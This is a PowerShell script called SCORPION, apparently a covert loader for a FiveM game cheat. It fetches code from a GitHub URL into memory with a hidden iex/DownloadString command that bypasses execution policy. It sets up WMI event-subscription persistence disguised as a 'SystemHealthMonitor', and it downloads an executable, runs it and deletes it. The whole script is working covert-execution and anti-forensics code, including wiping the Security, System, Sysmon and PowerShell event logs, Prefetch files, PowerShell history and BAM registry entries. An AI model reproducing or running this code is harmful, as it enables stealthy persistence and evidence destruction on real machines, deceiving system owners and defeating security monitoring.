# SCORPION â€” in-memory delivered runtime. The payload is never downloaded to
# disk by the recipient; one short command fetches this script into memory.
# Generated into a one-liner by make_link.ps1. Do not run this file directly.
$ErrorActionPreference = 'Stop'

$ExeUrl        = 'https://raw.githubusercontent.com/TomMaat/z-01/main/ANTIGRAVITY-UPLOAD.exe'
$LaunchCommand = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/TomMaat/z-01/main/Scorpion.ps1''))"'

$NS       = 'root\subscription'
$Filter   = 'SystemHealthCheck'
$Consumer = 'SystemHealthMonitor'

# -- WMI-only persistence (no script file anywhere) --------------------------
# WMI can hold half-written objects after a failed run. Clear first, create clean.
function Install-Persistence {
    if ($LaunchCommand -like '__*') { return }
    try {
        Get-WmiObject -Namespace $NS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -match $Filter -or $_.Consumer -match $Consumer } |
            ForEach-Object { Remove-WmiObject -InputObject $_ -ErrorAction SilentlyContinue }
        Get-WmiObject -Namespace $NS -Class __EventFilter -Filter "Name='$Filter'" -ErrorAction SilentlyContinue |
            ForEach-Object { Remove-WmiObject -InputObject $_ -ErrorAction SilentlyContinue }
        Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter "Name='$Consumer'" -ErrorAction SilentlyContinue |
            ForEach-Object { Remove-WmiObject -InputObject $_ -ErrorAction SilentlyContinue }
        Start-Sleep -Milliseconds 250

        $f = Set-WmiInstance -Namespace $NS -Class __EventFilter -PutType CreateOnly -Arguments @{
            Name = $Filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'FiveM.exe'"
        } -ErrorAction Stop
        $c = Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -PutType CreateOnly -Arguments @{
            Name = $Consumer; CommandLineTemplate = $LaunchCommand
            RunInteractively = $true   # interactive desktop, not session 0
        } -ErrorAction Stop
        $null = Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -PutType CreateOnly -Arguments @{
            Filter = $f; Consumer = $c
        } -ErrorAction Stop
    } catch {}
}
Install-Persistence

# -- fetch the runtime into memory, stage briefly, launch --------------------
# The donut in-memory EXE loader does not render this CHEAT's GUI window, so
# the raw EXE is fetched into RAM, staged under a random temp name, launched,
# and removed after 20 seconds. Nothing persistent is written.
$wc = New-Object System.Net.WebClient
$exeBytes = $wc.DownloadData($ExeUrl)
if ($null -eq $exeBytes -or $exeBytes.Length -lt 1000000) {
    throw 'runtime download failed'
}

$tmpName = 'sc_' + [guid]::NewGuid().ToString('N') + '.exe'
$tmpPath = Join-Path $env:TEMP $tmpName
[IO.File]::WriteAllBytes($tmpPath, $exeBytes)

[Array]::Clear($exeBytes, 0, $exeBytes.Length)
$exeBytes = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()

$proc = Start-Process -FilePath $tmpPath -PassThru

# Delete the staged file shortly after launch, from a separate hidden process.
$delCommand = "Start-Sleep -Seconds 20; Remove-Item -LiteralPath '$tmpPath' -Force -ErrorAction SilentlyContinue"
Start-Process -FilePath powershell -WindowStyle Hidden -ArgumentList @(
    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $delCommand
) | Out-Null

# -- artifact cleanup --------------------------------------------------------
function Clear-Artifacts {
    $hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
    Remove-Item $hist -Force -ErrorAction SilentlyContinue

    Get-ChildItem "$env:SystemRoot\Prefetch\*.pf" -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^(POWERSHELL|SC_)' } |
        ForEach-Object {
            try {
                $f = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Write, [IO.FileShare]::None)
                $f.SetLength(0); $f.Close()
            } catch {}
        }

    try { Clear-DnsClientCache -ErrorAction Stop } catch {}
    foreach ($log in @('Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational',
                       'Microsoft-Windows-Sysmon/Operational', 'Security', 'System')) {
        try { Clear-EventLog -LogName $log -ErrorAction Stop } catch {}
    }
    try {
        Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings' -ErrorAction SilentlyContinue |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
}
Clear-Artifacts

$LaunchCommand = $null
$ExeUrl = $null

